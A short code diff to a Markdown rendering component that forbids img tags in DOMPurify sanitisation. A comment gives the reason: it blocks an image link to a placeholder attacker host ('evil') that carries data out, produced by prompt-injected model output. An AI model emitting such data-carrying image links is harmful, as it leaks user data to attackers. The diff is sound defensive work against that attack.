@@ -15,7 +15,11 @@ import { cn } from '@/lib/utils'
 export function Markdown({ content, className }: { content: string; className?: string }) {
   const html = useMemo(() => {
     const parsed = marked.parse(content, { breaks: true, gfm: true, async: false })
-    return DOMPurify.sanitize(parsed as string, { USE_PROFILES: { html: true } })
+    return DOMPurify.sanitize(parsed as string, {
+      USE_PROFILES: { html: true },
+      // Blocks `![](https://evil/?d=...)` from prompt-injected model output.
+      FORBID_TAGS: ['img'],
+    })
   }, [content])
 
   return (
